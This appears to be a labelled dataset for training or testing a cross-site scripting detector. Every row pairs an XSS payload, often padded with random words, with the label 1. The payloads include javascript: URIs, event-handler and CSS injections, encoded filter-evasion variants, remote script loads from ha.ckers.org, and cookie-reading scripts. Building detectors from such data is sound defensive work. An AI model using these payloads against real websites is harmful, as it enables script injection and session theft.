payload	xss
tetroxalate <META HTTP-EQUIV=&quotrefresh&quot CONTENT=&quot0;url=javascript:alert(&quotXSS&quot);&quot&gt	1
controvert <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);"> booklear	1
eyases <OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> eavesing	1
self-lover <OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"&gt</OBJECT&gt	1
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"&gt</OBJECT&gt	1
russet-backed <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt<param name=url value=javascript:alert(&quotXSS&quot)&gt</OBJECT&gt	1
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>	1
bacterioscopic &ltP STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">	1
unexpired &ltSCRIPT "a='&gt'" SRC="http://ha.ckers.org/xss.js"&gt&lt/SCRIPT&gt	1
escobadura <SCRIPT ="&gt" SRC="http://ha.ckers.org/xss.js"&gt</SCRIPT&gt	1
keratinous <SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>	1
fashionmonger <SCRIPT SRC="%(jpg)s"></SCRIPT>	1
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>	1
&ltSCRIPT SRC=%(jscript)s?&ltB>	1
<SCRIPT SRC=//ha.ckers.org/.j>	1
armaries &ltSCRIPT SRC=http://ha.ckers.org/xss.js>&lt/SCRIPT> remilitarizing	1
probuilding &ltSCRIPT SRC=http://ha.ckers.org/xss.js?&lt B > unswing	1
intoxicators &ltSCRIPT SRC=http://ha.ckers.org/xss.js?&ltB> nonabridgment	1
pilulous <SCRIPT a="&gt" '' SRC="http://ha.ckers.org/xss.js"&gt</SCRIPT&gt unpenally	1
Gaspee &ltSCRIPT a=">" SRC="http://ha.ckers.org/xss.js">&lt/SCRIPT>	1
&ltSCRIPT a=&quot>&quot>&quot SRC=&quothttp://ha.ckers.org/xss.js&quot>&lt/SCRIPT>	1
afray &ltSCRIPT a=`&gt` SRC="http://ha.ckers.org/xss.js"&gt&lt/SCRIPT&gt photoreconnaissance	1
KIA <SCRIPT onreadystatechange=javascript:javascript:alert(1);&gt</SCRIPT&gt ungroveling	1
referee &ltSCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);&lt/SCRIPT># semidangerousness	1
succories &ltSCRIPT/SRC="%(jscript)s">&lt/SCRIPT> shuns	1
hydrachnid <SCRIPT/SRC=&quothttp://ha.ckers.org/xss.js&quot></SCRIPT> Seligman	1
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"&gt</SCRIPT&gt	1
<SCRIPT>a=/XSS/	1
<SCRIPT>alert('XSS');</SCRIPT>	1
consolatory <SCRIPT&gtdocument.write("<SCRI");</SCRIPT&gtPT SRC="http://ha.ckers.org/xss.js"&gt</SCRIPT&gt	1
<STYLE TYPE="text/javascript">alert(&quotXSS&quot);</STYLE>	1
&ltSTYLE TYPE="text/javascript"&gtjavascript:alert(1);&lt/STYLE&gt	1
pauxi <STYLE type="text/css"&gtBODY{background:url("javascript:alert(&quotXSS&quot)")}</STYLE&gt	1
disembody <STYLE type=&quottext/css&quot>BODY{background:url(&quotjavascript:javascript:alert(1)&quot)}</STYLE>	1
Basilidianism <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A> stick-leg	1
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>	1
photodissociation <STYLE>@im\port'\ja\vasc\ript:alert(&quotXSS&quot)';</STYLE>	1
armholes <STYLE>@import&quot%(css)s&quot;</STYLE> asphyxiating	1
misbirth &ltSTYLE>@import&quothttp://ha.ckers.org/xss.css&quot;&lt/STYLE> insoluble	1
Bandor <STYLE&gtBODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE&gt unsucceeded	1
catarrhinian <STYLE>a{background:url(&quots1&quot &quots2)}@import javascript:javascript:alert(1);&quot);}</STYLE>	1
&ltSTYLE>li {list-style-image: url("javascript:alert(&quotXSS&quot)");}&lt/STYLE>&ltUL>&ltLI>XSS&lt/br>	1
&ltSTYLE&gtli {list-style-image: url("javascript:javascript:alert(1)");}&lt/STYLE&gt&ltUL&gt&ltLI&gtXSS	1
<SVg </onlOad ="1> (_=prompt,_(1)) "">	1
rhabdophobia <ScRiPt>alert(1)</sCriPt> Whallonsburg	1
&ltScRipT 5-0*3+9/3=>prompt(1)&lt/ScRipT giveanswerhere=?	1
P.P. <ScRipT>alert("XSS");</ScRipT> Karamanlis	1
sickle &ltTABLE BACKGROUND="javascript:alert('XSS')"> Proteosaurus	1
computation&quots <TABLE BACKGROUND="javascript:javascript:alert(1)"&gt	1
engracing &ltTABLE>&ltTD BACKGROUND="javascript:alert('XSS')">	1
<TABLE&gt<TD BACKGROUND="javascript:javascript:alert(1)"&gt	1
&ltX OnXxx=1 	1
<X onxxx=1 	1
gunmetal <XML ID=I&gt<X&gt<C&gt<![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);"&gt]]</C&gt<X&gt</xml&gt semirepublic	1
purge <XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML> epidemiographist	1
shaftings <XSS STYLE="behavior: url(%(htc)s);">	1
eviler &ltXSS STYLE="behavior: url(xss.htc);">	1
unprocreate &ltXSS STYLE="xss:expression(alert(&quotXSS&quot))"> liquidation	1
<XSS STYLE=&quotxss:expression(javascript:alert(1))&quot>	1
goloshes <Z oncut=alert()>x	1
<a  href=&quotdata:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203&quot>Click  Me</a>	1
tolerances <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe floodgate	1
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe	1
low-pressure &lta class=bar href="http://www.example.org">www.example.org&lt/a> porket	1
thick-necked &lta draggable="true" ondrag="alert(1)">test&lt/a>	1
<a draggable="true" ondragend="alert(1)"&gttest</a&gt	1
&lta draggable="true" ondragenter="alert(1)"&gttest&lt/a&gt	1
Pyrenaeus &lta draggable="true" ondragleave="alert(1)">test&lt/a> meltage	1
thirty-thirty <a draggable="true" ondragstart="alert(1)"&gttest</a&gt	1
toad-hating <a href="\x00javascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>	1
&lta href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test&lt/a>	1
diiodoform &lta href="\x03javascript:javascript:alert(1)" id="fuzzelement1"&gttest&lt/a&gt	1
full-digested &lta href="\x04javascript:javascript:alert(1)" id="fuzzelement1"&gttest&lt/a&gt	1
autoluminescence <a href=&quot\x05javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test</a>	1
Deluc <a href="\x06javascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt bonaught	1
decresc. <a href=&quot\x07javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test</a>	1
zinkifies &lta href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test&lt/a>	1
ziff &lta href=&quot\x09javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test&lt/a>	1
<a href=&quot\x0Ajavascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test</a>	1
Phar <a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
sauropsidan <a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a> uppercuts	1
rokee <a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>	1
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>	1
&lta href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test&lt/a>	1
queer-shaped <a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>	1
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>	1
bushwack &lta href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test&lt/a>	1
unresplendent <a href="\x13javascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
tetrevangelium <a href=&quot\x14javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot&gttest</a&gt	1
snobling <a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>	1
outserts <a href=&quot\x16javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test</a>	1
stigma <a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a> heart-shaped	1
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
<a href=&quot\x19javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test</a>	1
&lta href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test&lt/a>	1
unapplicableness <a href=&quot\x1Bjavascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test</a>	1
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
Pecora &lta href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test&lt/a> supergroup	1
single-eyed &lta href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test&lt/a>	1
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
spumonis &lta href=&quot\x20javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test&lt/a>	1
&lta href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test&lt/a>	1
conditionalist <a href=&quot\xE1\x9A\x80javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test</a>	1
&lta href=&quot\xE1\xA0\x8Ejavascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test&lt/a>	1
norites <a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
saltchuck <a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>	1
<a href=&quot\xE2\x80\x82javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test</a>	1
Eupterotidae <a href=&quot\xE2\x80\x83javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test</a>	1
touchdown <a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>	1
&lta href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test&lt/a>	1
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>	1
parkleaves <a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
secondo &lta href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test&lt/a>	1
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>	1
<a href=&quot\xE2\x80\xA9javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot&gttest</a&gt	1
tweediest <a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt polytope	1
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
clanked <a href=&quot\xE3\x80\x80javascript:javascript:alert(1)&quot id=&quotfuzzelement1&quot&gttest</a&gt brotherly	1
aposematically &lta href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X&lt/a	1
illudedly &lta href="data:text/html;base64_,&ltsvg/onload=\u0061&#x6C;&#101%72t(1)>">X&lt/a	1
peatweed <a href=&quotdata:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203&quot>Click Me</a> vermin-covered	1
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>	1
<a href=&quotjav&#65ascript:javascript:alert(1)&quot>test1</a>	1
mythologizer &lta href="jav&#97ascript:javascript:alert(1)"&gttest1&lt/a&gt Mortensen	1
&lta href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test&lt/a>	1
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>	1
overspeed <a href=&quotjavas\x02cript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test</a>	1
rufopiceous <a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>	1
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>	1
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>	1
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>	1
diguanide <a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
pumpknot <a href=&quotjavas\x09cript:javascript:alert(1)&quot id=&quotfuzzelement1&quot&gttest</a&gt	1
tirr <a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
symmetricalness <a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>	1
blanquillos &lta href=&quotjavas\x0Ccript:javascript:alert(1)&quot id=&quotfuzzelement1&quot>test&lt/a>	1
delver <a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
elemicin &lta href=&quotjavascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;&quot>&ltbutton>	1
trenches <a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"> esophagean	1
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;&gtX</a&gt	1
&lta href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test&lt/a>	1
Bazine <a href=&quotjavascript\x09:javascript:alert(1)&quot id=&quotfuzzelement1&quot&gttest</a&gt Gansevoort	1
precluded &lta href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test&lt/a> Erina	1
mainprisor &lta href="javascript\x0D:javascript:alert(1)" id="fuzzelement1"&gttest&lt/a&gt	1
&lta href="javascript\x3A:javascript:alert(1)" id="fuzzelement1"&gttest&lt/a&gt	1
Irishian <a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1"&gttest</a&gt	1
hyperstoical &lta href=http://foo.bar/#x=`y>&lt/a>&ltimg alt=&quot`>&ltimg src=x:x onerror=javascript:alert(1)>&lt/a>&quot>	1
Dutch-process &lta href=http://foo.bar/#x=`y>&lt/a>&ltimg alt="`>&ltimg src=xx:x onerror=alert(108)>&lt/a>">	1
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)&gtXXX</a&gt	1
Squilla <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a> Johnsonianly	1
monosilicate <a href=javascript:alert(1)&gtclick 	1
bidree <a id="x"><rect fill="white" width="1000" height="1000"/></a> nonnavigability	1
<a id=x tabindex=1 onactivate=alert(1)></a>	1
unambitiously <a id=x tabindex=1 onbeforeactivate=alert(1)></a>	1
sepsis <a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus> cohesiveness	1
<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>	1
<a id=x tabindex=1 onfocus=alert(1)&gt</a&gt	1
&lta id=x tabindex=1 onfocusin=alert(1)>&lt/a>	1
Polymastodon <a onbeforecopy=&quotalert(1)&quot contenteditable&gttest</a&gt	1
nonmonarchic <a onbeforecut="alert(1)" contenteditable>test</a>	1
fellow-creature <a onbeforepaste=&quotalert(1)&quot contenteditable>test</a>	1
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>	1
missive &lta onclick="alert(1)"&gttest&lt/a&gt foreseeability	1
<a oncontextmenu=&quotalert(1)&quot>test</a>	1
<a oncopy="alert(1)" contenteditable>test</a>	1
&lta oncut=&quotalert(1)&quot contenteditable>test&lt/a>	1
<a ondblclick="alert(1)">test</a>	1
restifle <a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus> mezzo-soprano	1
troublers <a onkeydown=&quotalert(1)&quot contenteditable>test</a> mistress-piece	1
cothy &lta onkeypress=&quotalert(1)&quot contenteditable>test&lt/a>	1
<a onkeyup="alert(1)" contenteditable&gttest</a&gt	1
affecter <a onmousedown="alert(1)"&gttest</a&gt discal	1
king-of-arms <a onmouseenter="alert(1)"&gttest</a&gt	1
subuniverse <a onmouseleave="alert(1)">test</a> Johnette	1
valines <a onmousemove=&quotalert(1)&quot>test</a> unpatronized	1
Anaxonia &lta onmouseout="alert(1)">test&lt/a>	1
mesostomid <a onmouseover="alert(1)">test</a>	1
synd. <a onmouseover=&quotalert(document.cookie)&quot&gtxxs link</a&gt	1
celiacs <a onmouseover=alert(document.cookie)&gtxxs link</a&gt amusiveness	1
<a onmouseup="alert(1)">test</a>	1
<a onpaste="alert(1)" contenteditable>test</a>	1
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current"&gtX	1
&lta style=&quotbehavior:url(#default#AnchorClick);&quot folder=&quotjavascript:javascript:alert(1)&quot>XXX&lt/a>	1
Antabus &lta style="pointer-events:none;position:absolute;"&gt&lta style="position:absolute;" onclick="javascript:alert(1);"&gtXXX&lt/a&gt&lt/a&gt&lta href="javascript:javascript:alert(1)"&gtXXX&lt/a&gt	1
Piaropus <a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E	1
Tebeth <a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>	1
unraftered &lta target="x" href="xssme?xss=&ltscript>function x(window) { eval(location.hash.substr(1)) }&lt/script>&ltiframe src=%22javascript:parent.x(window);%22>&lt/iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();	1
&lta target="x" href="xssme?xss=&ltscript>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)&lt/script>#&ltiframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk>&lt/iframe>	1
<a xmlns:xlink=&quothttp://www.w3.org/1999/xlink&quot xlink:href=&quot?&quot>	1
declivities &lta xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)">&ltrect width="1000" height="1000" fill="white"/>&lt/a> sinned	1
GW <a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"&gtXYZ</a ruffer	1
o.e. &lta/href="javascript:&#13; javascript:prompt(1)">&ltinput type="X"> Anglicise	1
&ltabbr draggable="true" ondrag="alert(1)">test&lt/abbr>	1
<abbr draggable="true" ondragend="alert(1)">test</abbr>	1
bedabbled <abbr draggable="true" ondragenter="alert(1)">test</abbr>	1
haematein <abbr draggable="true" ondragleave="alert(1)"&gttest</abbr&gt Egypticity	1
proflavine <abbr draggable=&quottrue&quot ondragstart=&quotalert(1)&quot&gttest</abbr&gt	1
frenetic <abbr id=x tabindex=1 onactivate=alert(1)&gt</abbr&gt	1
<abbr id=x tabindex=1 onbeforeactivate=alert(1)&gt</abbr&gt	1
&ltabbr id=x tabindex=1 onbeforedeactivate=alert(1)>&lt/abbr>&ltinput autofocus>	1
snubbishly <abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus> maladdress	1
<abbr id=x tabindex=1 onfocus=alert(1)></abbr>	1
<abbr id=x tabindex=1 onfocusin=alert(1)&gt</abbr&gt	1
NPR &ltabbr onbeforecopy="alert(1)" contenteditable>test&lt/abbr> radioiron	1
<abbr onbeforecut="alert(1)" contenteditable&gttest</abbr&gt	1
nonveterinaries <abbr onbeforepaste="alert(1)" contenteditable&gttest</abbr&gt Knapp	1
&ltabbr onblur=alert(1) tabindex=1 id=x>&lt/abbr>&ltinput autofocus>	1
<abbr onclick=&quotalert(1)&quot>test</abbr>	1
Aldhafara <abbr oncontextmenu="alert(1)">test</abbr>	1
trachling &ltabbr oncopy="alert(1)" contenteditable>test&lt/abbr> nonattributively	1
<abbr oncut=&quotalert(1)&quot contenteditable>test</abbr>	1
Jermayne <abbr ondblclick="alert(1)"&gttest</abbr&gt	1
<abbr onfocusout=alert(1) tabindex=1 id=x&gt</abbr&gt<input autofocus&gt	1
<abbr onkeydown=&quotalert(1)&quot contenteditable>test</abbr>	1
sophisticism <abbr onkeypress="alert(1)" contenteditable>test</abbr> unsteck	1
&ltabbr onkeyup=&quotalert(1)&quot contenteditable>test&lt/abbr>	1
<abbr onmousedown="alert(1)">test</abbr>	1
unquickly <abbr onmouseenter="alert(1)"&gttest</abbr&gt	1
hoatzines <abbr onmouseleave=&quotalert(1)&quot>test</abbr> arthra	1
sandy-red <abbr onmousemove="alert(1)">test</abbr>	1
<abbr onmouseout=&quotalert(1)&quot>test</abbr>	1
credencive &ltabbr onmouseover="alert(1)">test&lt/abbr> FTW	1
unpassive &ltabbr onmouseup="alert(1)">test&lt/abbr>	1
basepoint <abbr onpaste=&quotalert(1)&quot contenteditable>test</abbr> brodeglass	1
incandescences <acronym draggable="true" ondrag="alert(1)"&gttest</acronym&gt presubmit	1
mischarge <acronym draggable="true" ondragend="alert(1)"&gttest</acronym&gt Paranagua	1
<acronym draggable="true" ondragenter="alert(1)"&gttest</acronym&gt	1
pew's &ltacronym draggable=&quottrue&quot ondragleave=&quotalert(1)&quot>test&lt/acronym> silver-fork	1
<acronym draggable="true" ondragstart="alert(1)">test</acronym>	1
photomapping &ltacronym id=x tabindex=1 onactivate=alert(1)>&lt/acronym>	1
&ltacronym id=x tabindex=1 onbeforeactivate=alert(1)>&lt/acronym>	1
unstigmatic <acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus> Gelderland	1
<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>	1
navicert &ltacronym id=x tabindex=1 onfocus=alert(1)>&lt/acronym>	1
ultrafilter <acronym id=x tabindex=1 onfocusin=alert(1)></acronym>	1
<acronym onbeforecopy="alert(1)" contenteditable>test</acronym>	1
<acronym onbeforecut="alert(1)" contenteditable&gttest</acronym&gt	1
coenzymatically <acronym onbeforepaste="alert(1)" contenteditable>test</acronym> palatoplegia	1
unrobbed <acronym onblur=alert(1) tabindex=1 id=x&gt</acronym&gt<input autofocus&gt	1
&ltacronym onclick="alert(1)">test&lt/acronym>	1
<acronym oncontextmenu="alert(1)">test</acronym>	1
